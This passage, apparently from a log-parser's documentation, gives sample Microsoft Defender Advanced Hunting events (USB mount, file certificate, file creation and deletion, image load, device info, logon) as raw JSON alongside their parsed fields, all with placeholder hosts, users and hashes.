Storage\\\",\\\"ProductRevision\\\":\\\"1.00\\\",\\\"Manufacturer\\\":\\\"StorLib\\\",\\\"Volume\\\":\\\"Volume{volume-id}\\\",\\\"LoggedOnUsers\\\":[\\\"user@example.com\\\"]}\",\"InitiatingProcessAccountSid\":null,\"AppGuardContainerId\":null,\"InitiatingProcessSHA256\":null,\"SHA256\":null,\"RemoteUrl\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"ActionType\":\"UsbDriveMounted\",\"FileOriginUrl\":null,\"FileOriginIP\":null,\"InitiatingProcessLogonId\":null,\"AccountSid\":null,\"RemoteDeviceName\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"LogonId\":null,\"LocalIP\":null,\"LocalPort\":null,\"RemoteIP\":null,\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"InitiatingProcessAccountUpn\":\"user@example.com\",\"InitiatingProcessAccountObjectId\":null,\"FileSize\":null,\"InitiatingProcessFileSize\":null,\"InitiatingProcessVersionInfoCompanyName\":null,\"InitiatingProcessVersionInfoProductName\":null,\"InitiatingProcessVersionInfoProductVersion\":null,\"InitiatingProcessVersionInfoInternalFileName\":null,\"InitiatingProcessVersionInfoOriginalFileName\":null,\"InitiatingProcessVersionInfoFileDescription\":null,\"InitiatingProcessSessionId\":null,\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"CreatedProcessSessionId\":null,\"IsProcessRemoteSession\":false,\"ProcessRemoteSessionDeviceName\":null,\"ProcessRemoteSessionIP\":null,\"Timestamp\":\"2025-09-10T14:00:08.9720411Z\",\"MachineGroup\":\"WKST FRANCE\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "host"
            ],
            "dataset": "device_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2025-09-10T14:00:08.972041Z",
        "action": {
            "name": "Publish",
            "properties": {
                "IsInitiatingProcessRemoteSession": "false"
            },
            "type": "UsbDriveMounted"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "device": {
            "manufacturer": "StorLib"
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "host.example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "582046"
                }
            }
        },
        "process": {
            "user": {
                "domain": "example.com",
                "email": "user@example.com",
                "name": "user1"
            }
        },
        "volume": {
            "bus_type": "3",
            "product_name": "Virtual Storage"
        }
    }
    	
	```


=== "test_device_file_certificate_info.json"

    ```json
	
    {
        "message": "{\"time\":\"2022-09-02T13:12:14.2082552Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceFileCertificateInfo\",\"properties\":{\"SHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"IsSigned\":true,\"IsRootSignerMicrosoft\":true,\"Signer\":\"Microsoft Windows\",\"SignerHash\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"Issuer\":\"Microsoft Windows Production PCA 2011\",\"IssuerHash\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"SignatureType\":\"Catalog\",\"IsTrusted\":true,\"CertificateCreationTime\":\"2021-09-02T18:23:41Z\",\"CertificateExpirationTime\":\"2022-09-01T18:23:41Z\",\"CertificateCountersignatureTime\":\"2022-07-06T05:55:26.23Z\",\"CrlDistributionPointUrls\":\"[\\\"http://www.microsoft.com/pkiops/crl/MicWinProPCA2011_2011-10-19.crl\\\"]\",\"CertificateSerialNumber\":\"330000033c89c66a7b45bb1fbd00000000033c\",\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"MachineGroup\":\"Windows 10 - remediate threats automatically\",\"Timestamp\":\"2022-09-02T13:10:10.7177Z\",\"DeviceName\":\"example.com\",\"ReportId\":20370}}",
        "event": {
            "category": [
                "file"
            ],
            "dataset": "device_file_certificate_info",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2022-09-02T13:10:10.717700Z",
        "action": {
            "name": "Publish"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "file": {
            "hash": {
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            },
            "x509": {
                "not_after": "2022-09-01T18:23:41Z",
                "serial_number": "330000033c89c66a7b45bb1fbd00000000033c"
            }
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "certificate": {
                    "counter_signed_at": "2022-07-06T05:55:26.23Z",
                    "created_at": "2021-09-02T18:23:41Z",
                    "crl": {
                        "urls": [
                            "http://www.microsoft.com/pkiops/crl/MicWinProPCA2011_2011-10-19.crl"
                        ]
                    },
                    "is_root_signer_microsort": true,
                    "is_signed": true,
                    "is_trusted": true,
                    "issuer": {
                        "hash": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                        "name": "Microsoft Windows Production PCA 2011"
                    },
                    "signature_type": "Catalog",
                    "signer": {
                        "hash": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                        "name": "Microsoft Windows"
                    }
                },
                "report": {
                    "id": "20370"
                }
            }
        },
        "related": {
            "hash": [
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ]
        }
    }
    	
	```


=== "test_device_file_event.json"

    ```json
	
    {
        "message": "{\"time\":\"2022-09-01T07:49:40.4279379Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceFileEvents\",\"properties\":{\"PreviousFileName\":null,\"FileName\":\"OneDriveFileLauncher.exe\",\"FolderPath\":\"ANONYMIZED\",\"PreviousFolderPath\":null,\"SHA1\":null,\"SHA256\":null,\"MD5\":null,\"FileSize\":null,\"FileOriginReferrerUrl\":null,\"FileOriginUrl\":null,\"FileOriginIP\":null,\"SensitivityLabel\":null,\"SensitivitySubLabel\":null,\"IsAzureInfoProtectionApplied\":null,\"ShareName\":null,\"RequestSourceIP\":null,\"RequestSourcePort\":null,\"RequestProtocol\":null,\"RequestAccountName\":null,\"RequestAccountDomain\":null,\"RequestAccountSid\":null,\"AdditionalFields\":null,\"ActionType\":\"FileDeleted\",\"InitiatingProcessVersionInfoCompanyName\":\"Microsoft Corporation\",\"InitiatingProcessVersionInfoProductName\":\"Microsoft OneDrive\",\"InitiatingProcessVersionInfoProductVersion\":\"22.166.0807.0002\",\"InitiatingProcessVersionInfoInternalFileName\":\"OneDriveSetup.exe\",\"InitiatingProcessVersionInfoOriginalFileName\":\"OneDriveSetup.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Microsoft OneDrive (64 bit) Setup\",\"InitiatingProcessFolderPath\":\"c:\\\\users\\\\USER\\\\appdata\\\\local\\\\microsoft\\\\onedrive\\\\update\\\\onedrivesetup.exe\",\"InitiatingProcessFileSize\":56824728,\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessAccountSid\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountUpn\":\"user@example.org\",\"InitiatingProcessAccountObjectId\":\"22222222-2222-2222-2222-222222222222\",\"InitiatingProcessCreationTime\":\"2022-09-01T07:46:34.0214941Z\",\"InitiatingProcessId\":27512,\"InitiatingProcessFileName\":\"OneDriveSetup.exe\",\"InitiatingProcessCommandLine\":\"OneDriveSetup.exe /update /restart /updateSource:ODU /peruser /childprocess /extractFilesWithLessThreadCount /renameReplaceOneDriveExe /renameReplaceODSUExe /removeNonCurrentVersions /enableODSUReportingMode \",\"InitiatingProcessParentCreationTime\":\"2022-09-01T07:46:33.5858992Z\",\"InitiatingProcessParentId\":588,\"InitiatingProcessParentFileName\":\"OneDriveSetup.exe\",\"InitiatingProcessIntegrityLevel\":\"Medium\",\"InitiatingProcessTokenElevation\":\"TokenElevationTypeDefault\",\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"AppGuardContainerId\":\"\",\"MachineGroup\":\"UnassignedGroup\",\"Timestamp\":\"2022-09-01T07:46:42.4684081Z\",\"DeviceName\":\"example.com\",\"ReportId\":152059}}",
        "event": {
            "category": [
                "file"
            ],
            "dataset": "device_file_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2022-09-01T07:46:42.468408Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessAccountObjectId": "22222222-2222-2222-2222-222222222222",
                "InitiatingProcessCommandLine": "OneDriveSetup.exe /update /restart /updateSource:ODU /peruser /childprocess /extractFilesWithLessThreadCount /renameReplaceOneDriveExe /renameReplaceODSUExe /removeNonCurrentVersions /enableODSUReportingMode ",
                "InitiatingProcessFileSize": 56824728,
                "InitiatingProcessIntegrityLevel": "Medium",
                "InitiatingProcessTokenElevation": "TokenElevationTypeDefault",
                "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
                "InitiatingProcessVersionInfoFileDescription": "Microsoft OneDrive (64 bit) Setup",
                "InitiatingProcessVersionInfoInternalFileName": "OneDriveSetup.exe",
                "InitiatingProcessVersionInfoOriginalFileName": "OneDriveSetup.exe",
                "InitiatingProcessVersionInfoProductName": "Microsoft OneDrive",
                "InitiatingProcessVersionInfoProductVersion": "22.166.0807.0002"
            },
            "type": "FileDeleted"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "file": {
            "directory": "ANONYMIZED",
            "name": "OneDriveFileLauncher.exe"
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "152059"
                }
            }
        },
        "process": {
            "args": [
                "",
                "/childprocess",
                "/enableODSUReportingMode",
                "/extractFilesWithLessThreadCount",
                "/peruser",
                "/removeNonCurrentVersions",
                "/renameReplaceODSUExe",
                "/renameReplaceOneDriveExe",
                "/restart",
                "/update",
                "/updateSource:ODU"
            ],
            "command_line": "OneDriveSetup.exe /update /restart /updateSource:ODU /peruser /childprocess /extractFilesWithLessThreadCount /renameReplaceOneDriveExe /renameReplaceODSUExe /removeNonCurrentVersions /enableODSUReportingMode ",
            "executable": "c:\\users\\USER\\appdata\\local\\microsoft\\onedrive\\update\\onedrivesetup.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "OneDriveSetup.exe",
            "parent": {
                "name": "OneDriveSetup.exe",
                "pid": 588,
                "start": "2022-09-01T07:46:33.585899Z"
            },
            "pid": 27512,
            "start": "2022-09-01T07:46:34.021494Z",
            "user": {
                "domain": "example.com",
                "email": "user@example.org",
                "id": "user1",
                "name": "user1"
            },
            "working_directory": "c:\\users\\USER\\appdata\\local\\microsoft\\onedrive\\update"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ]
        }
    }
    	
	```


=== "test_device_file_event_02.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-11-08T14:42:24.2882642Z\",\"tenantId\":\"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceFileEvents\",\"_TimeReceivedBySvc\":\"2024-11-08T14:41:06.9726687Z\",\"properties\":{\"SHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"FileSize\":640920,\"MD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"FileName\":\"FileName.dll\",\"FolderPath\":\"C:\\\\Program Files\\\\FileName.dll\",\"InitiatingProcessCommandLine\":\"commandexec.exe /V\",\"InitiatingProcessFileName\":\"commandexec.exe\",\"InitiatingProcessParentFileName\":\"services.exe\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessFolderPath\":\"c:\\\\windows\\\\system32\\\\commandexec.exe\",\"InitiatingProcessParentCreationTime\":\"2024-10-09T01:02:27.2227081Z\",\"InitiatingProcessId\":16468,\"DeviceName\":\"example.com\",\"DeviceId\":\"123456789abcdef\",\"InitiatingProcessCreationTime\":\"2024-11-08T14:38:23.2383083Z\",\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountSid\":\"S-1-2-3\",\"InitiatingProcessParentId\":888,\"ReportId\":341972,\"SHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessIntegrityLevel\":\"System\",\"InitiatingProcessTokenElevation\":\"TokenElevationTypeDefault\",\"FileOriginUrl\":null,\"FileOriginIP\":null,\"FileOriginReferrerUrl\":null,\"AppGuardContainerId\":\"\",\"ActionType\":\"FileCreated\",\"SensitivityLabel\":null,\"SensitivitySubLabel\":null,\"IsAzureInfoProtectionApplied\":null,\"RequestProtocol\":\"Local\",\"ShareName\":null,\"RequestSourceIP\":null,\"RequestSourcePort\":null,\"RequestAccountName\":\"user1\",\"RequestAccountDomain\":\"example.com\",\"RequestAccountSid\":\"S-1-2-3\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"AdditionalFields\":\"{\\\"FileType\\\":\\\"PortableExecutable\\\"}\",\"PreviousFolderPath\":\"\",\"PreviousFileName\":\"\",\"InitiatingProcessFileSize\":176128,\"InitiatingProcessVersionInfoCompanyName\":\"Microsoft Corporation\",\"InitiatingProcessVersionInfoProductName\":\"Windows Installer - Unicode\",\"InitiatingProcessVersionInfoProductVersion\":\"5.0.22621.3880\",\"InitiatingProcessVersionInfoInternalFileName\":\"commandexec\",\"InitiatingProcessVersionInfoOriginalFileName\":\"commandexec.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Windows\\u00ae installer\",\"InitiatingProcessSessionId\":\"11111111-1111-1111-1111-111111111111\",\"IsInitiatingProcessRemoteSession\":\"11111111-1111-1111-1111-111111111111\",\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"Timestamp\":\"2024-11-08T14:38:51.9048761Z\",\"MachineGroup\":null},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "file"
            ],
            "dataset": "device_file_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-11-08T14:38:51.904876Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessCommandLine": "commandexec.exe /V",
                "InitiatingProcessFileSize": 176128,
                "InitiatingProcessIntegrityLevel": "System",
                "InitiatingProcessSessionId": "11111111-1111-1111-1111-111111111111",
                "InitiatingProcessTokenElevation": "TokenElevationTypeDefault",
                "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
                "InitiatingProcessVersionInfoFileDescription": "Windows\u00ae installer",
                "InitiatingProcessVersionInfoInternalFileName": "commandexec",
                "InitiatingProcessVersionInfoOriginalFileName": "commandexec.exe",
                "InitiatingProcessVersionInfoProductName": "Windows Installer - Unicode",
                "InitiatingProcessVersionInfoProductVersion": "5.0.22621.3880",
                "IsInitiatingProcessRemoteSession": "11111111-1111-1111-1111-111111111111",
                "RequestAccountSid": "S-1-2-3"
            },
            "type": "FileCreated"
        },
        "agent": {
            "id": "123456789abcdef"
        },
        "file": {
            "directory": "C:\\Program Files\\FileName.dll",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "FileName.dll",
            "size": 640920
        },
        "host": {
            "id": "123456789abcdef",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "341972"
                }
            }
        },
        "network": {
            "protocol": "Local"
        },
        "process": {
            "args": [
                "/V"
            ],
            "command_line": "commandexec.exe /V",
            "executable": "c:\\windows\\system32\\commandexec.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "commandexec.exe",
            "parent": {
                "name": "services.exe",
                "pid": 888,
                "start": "2024-10-09T01:02:27.222708Z"
            },
            "pid": 16468,
            "start": "2024-11-08T14:38:23.238308Z",
            "user": {
                "domain": "example.com",
                "id": "S-1-2-3",
                "name": "user1"
            },
            "working_directory": "c:\\windows\\system32"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "user": [
                "user1"
            ]
        },
        "user": {
            "domain": "example.com",
            "name": "user1"
        }
    }
    	
	```


=== "test_device_image_load_event.json"

    ```json
	
    {
        "message": "{\"time\":\"2022-09-01T07:49:37.5372014Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceImageLoadEvents\",\"properties\":{\"FolderPath\":\"C:\\\\Program Files (x86)\\\\Adobe\\\\8.1\\\\Client\\\\BIN\\\\sscfom.dll\",\"FileSize\":1048576,\"FileName\":\"sscfom.dll\",\"MD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"SHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"SHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessVersionInfoCompanyName\":null,\"InitiatingProcessVersionInfoProductName\":null,\"InitiatingProcessVersionInfoProductVersion\":null,\"InitiatingProcessVersionInfoInternalFileName\":null,\"InitiatingProcessVersionInfoOriginalFileName\":null,\"InitiatingProcessVersionInfoFileDescription\":null,\"InitiatingProcessFolderPath\":\"c:\\\\program files (x86)\\\\adobe\\\\8.1\\\\client\\\\bin\\\\autosync.exe\",\"InitiatingProcessFileName\":\"autosync.exe\",\"InitiatingProcessFileSize\":66560,\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessAccountSid\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountUpn\":\"user@example.org\",\"InitiatingProcessAccountObjectId\":null,\"InitiatingProcessCreationTime\":\"2022-09-01T07:47:58.182445Z\",\"InitiatingProcessId\":15584,\"InitiatingProcessCommandLine\":\"\\\"autosync.exe\\\" /c C:\\\\PROGRA~2\\\\adobe\\\\8.1\\\\Client\\\\bin\\\\fra\\\\adobe.cfg /c \\\" usa\\\"\",\"InitiatingProcessParentCreationTime\":\"2022-09-01T07:47:17.01345Z\",\"InitiatingProcessParentId\":2548,\"InitiatingProcessParentFileName\":\"explorer.exe\",\"InitiatingProcessIntegrityLevel\":\"Medium\",\"InitiatingProcessTokenElevation\":\"TokenElevationTypeDefault\",\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"AppGuardContainerId\":\"\",\"MachineGroup\":\"Windows 10 - remediate threats automatically\",\"Timestamp\":\"2022-09-01T07:47:58.6161271Z\",\"DeviceName\":\"example.com\",\"ReportId\":3758,\"ActionType\":\"ImageLoaded\"}}",
        "event": {
            "category": [
                "process"
            ],
            "dataset": "device_image_load_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2022-09-01T07:47:58.616127Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessCommandLine": "\"autosync.exe\" /c C:\\PROGRA~2\\adobe\\8.1\\Client\\bin\\fra\\adobe.cfg /c \" usa\"",
                "InitiatingProcessFileSize": 66560,
                "InitiatingProcessIntegrityLevel": "Medium",
                "InitiatingProcessTokenElevation": "TokenElevationTypeDefault"
            },
            "type": "ImageLoaded"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "file": {
            "directory": "C:\\Program Files (x86)\\Adobe\\8.1\\Client\\BIN\\sscfom.dll",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "sscfom.dll",
            "size": 1048576
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "3758"
                }
            }
        },
        "process": {
            "args": [
                "\"",
                "/c",
                "/c",
                "C:\\PROGRA~2\\adobe\\8.1\\Client\\bin\\fra\\adobe.cfg",
                "usa\""
            ],
            "command_line": "\"autosync.exe\" /c C:\\PROGRA~2\\adobe\\8.1\\Client\\bin\\fra\\adobe.cfg /c \" usa\"",
            "executable": "c:\\program files (x86)\\adobe\\8.1\\client\\bin\\autosync.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "autosync.exe",
            "parent": {
                "name": "explorer.exe",
                "pid": 2548,
                "start": "2022-09-01T07:47:17.013450Z"
            },
            "pid": 15584,
            "start": "2022-09-01T07:47:58.182445Z",
            "user": {
                "domain": "example.com",
                "email": "user@example.org",
                "id": "user1",
                "name": "user1"
            },
            "working_directory": "c:\\program files (x86)\\adobe\\8.1\\client\\bin"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ]
        }
    }
    	
	```


=== "test_device_info_event_add_join.json"

    ```json
	
    {
        "message": "{\"time\":\"2023-01-02T17:21:10.6891411Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceInfo\",\"properties\":{\"ClientVersion\":\"10.8295.19041.2311\",\"PublicIP\":\"1.1.1.1\",\"DeviceName\":\"example.com\",\"DeviceId\":\"68b329da9893e34099c7d8ad5cb9c940\",\"ReportId\":11111,\"Timestamp\":\"2023-01-02T17:18:18.4028562Z\",\"OSArchitecture\":null,\"OSPlatform\":null,\"OSBuild\":null,\"IsAzureADJoined\":true,\"LoggedOnUsers\":\"[{\\\"UserName\\\":\\\"JOHNDOE\\\",\\\"DomainName\\\":\\\"INTRANET\\\",\\\"Sid\\\":\\\"S-1-11-1-1111111111-1111111111-1111111111-1111111111\\\"}]\",\"RegistryDeviceTag\":null,\"OSVersion\":null,\"AdditionalFields\":\"[]\",\"AadDeviceId\":\"22222222-2222-2222-2222-222222222222\",\"MergedDeviceIds\":\"\",\"MergedToDeviceId\":\"\",\"Vendor\":\"\",\"Model\":\"\",\"OnboardingStatus\":\"Onboarded\",\"DeviceCategory\":\"Endpoint\",\"DeviceType\":\"Workstation\",\"DeviceSubtype\":null,\"OSVersionInfo\":\"\",\"OSDistribution\":\"\",\"JoinType\":\"AAD Joined\",\"MachineGroup\":\"UnassignedGroup\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "host"
            ],
            "dataset": "device_info_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2023-01-02T17:18:18.402856Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AadDeviceId": "22222222-2222-2222-2222-222222222222",
                "IsAzureADJoined": true,
                "JoinType": "AAD Joined",
                "LoggedOnUsers": [
                    "{\"DomainName\":\"INTRANET\",\"Sid\":\"S-1-11-1-1111111111-1111111111-1111111111-1111111111\",\"UserName\":\"JOHNDOE\"}"
                ],
                "MachineGroup": "UnassignedGroup",
                "OnboardingStatus": "Onboarded"
            }
        },
        "agent": {
            "id": "68b329da9893e34099c7d8ad5cb9c940",
            "version": "10.8295.19041.2311"
        },
        "host": {
            "id": "68b329da9893e34099c7d8ad5cb9c940",
            "name": "example.com",
            "type": "Workstation"
        },
        "microsoft": {
            "defender": {
                "host": {
                    "category": "Endpoint"
                },
                "report": {
                    "id": "11111"
                }
            }
        },
        "related": {
            "ip": [
                "1.1.1.1"
            ],
            "user": [
                "JOHNDOE"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        },
        "user": {
            "domain": "INTRANET",
            "id": "S-1-11-1-1111111111-1111111111-1111111111-1111111111",
            "name": "JOHNDOE"
        }
    }
    	
	```


=== "test_device_info_event_hybrid_join.json"

    ```json
	
    {
        "message": "{\"time\":\"2023-01-02T17:21:10.6890829Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceInfo\",\"properties\":{\"ClientVersion\":\"10.8295.19041.2311\",\"PublicIP\":\"1.1.1.1\",\"DeviceName\":\"example.com\",\"DeviceId\":\"68b329da9893e34099c7d8ad5cb9c940\",\"ReportId\":22222,\"Timestamp\":\"2023-01-02T17:16:49.4177838Z\",\"OSArchitecture\":null,\"OSPlatform\":null,\"OSBuild\":null,\"IsAzureADJoined\":true,\"LoggedOnUsers\":\"[]\",\"RegistryDeviceTag\":null,\"OSVersion\":null,\"AdditionalFields\":\"[]\",\"AadDeviceId\":\"22222222-2222-2222-2222-222222222222\",\"MergedDeviceIds\":\"\",\"MergedToDeviceId\":\"\",\"Vendor\":\"\",\"Model\":\"\",\"OnboardingStatus\":\"Onboarded\",\"DeviceCategory\":\"Endpoint\",\"DeviceType\":\"Workstation\",\"DeviceSubtype\":null,\"OSVersionInfo\":\"\",\"OSDistribution\":\"\",\"JoinType\":\"Hybrid Azure AD Join\",\"MachineGroup\":\"Windows 10 - remediate threats automatically\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "host"
            ],
            "dataset": "device_info_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2023-01-02T17:16:49.417783Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AadDeviceId": "22222222-2222-2222-2222-222222222222",
                "IsAzureADJoined": true,
                "JoinType": "Hybrid Azure AD Join",
                "LoggedOnUsers": [],
                "MachineGroup": "Windows 10 - remediate threats automatically",
                "OnboardingStatus": "Onboarded"
            }
        },
        "agent": {
            "id": "68b329da9893e34099c7d8ad5cb9c940",
            "version": "10.8295.19041.2311"
        },
        "host": {
            "id": "68b329da9893e34099c7d8ad5cb9c940",
            "name": "example.com",
            "type": "Workstation"
        },
        "microsoft": {
            "defender": {
                "host": {
                    "category": "Endpoint"
                },
                "report": {
                    "id": "22222"
                }
            }
        },
        "related": {
            "ip": [
                "1.1.1.1"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        }
    }
    	
	```


=== "test_device_logon_events.json"

    ```json
	
    {
        "message": "{\"time\":\"2023-01-04T14:26:25.0567375Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceLogonEvents\",\"properties\":{\"AccountName\":\"user1\",\"AccountDomain\":\"example.com\",\"LogonType\":\"Interactive\",\"DeviceId\":\"68b329da9893e34099c7d8ad5cb9c940\",\"DeviceName\":\"example.com\",\"ReportId\":21833,\"Timestamp\":\"2023-01-04T13:25:36.1936997Z\",\"AccountSid\":\"S-1-1-11-1-1\",\"AppGuardContainerId\":\"\",\"LogonId\":111111,\"RemoteIP\":\"\",\"RemotePort\":null,\"RemoteDeviceName\":\"\",\"ActionType\":\"LogonSuccess\",\"InitiatingProcessId\":3660,\"InitiatingProcessCreationTime\":\"2023-01-04T13:25:35.9877068Z\",\"InitiatingProcessFileName\":\"winlogon.exe\",\"InitiatingProcessFolderPath\":\"C:\\\\Windows\\\\System32\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessSHA256\":null,\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessCommandLine\":\"WinLogon.exe 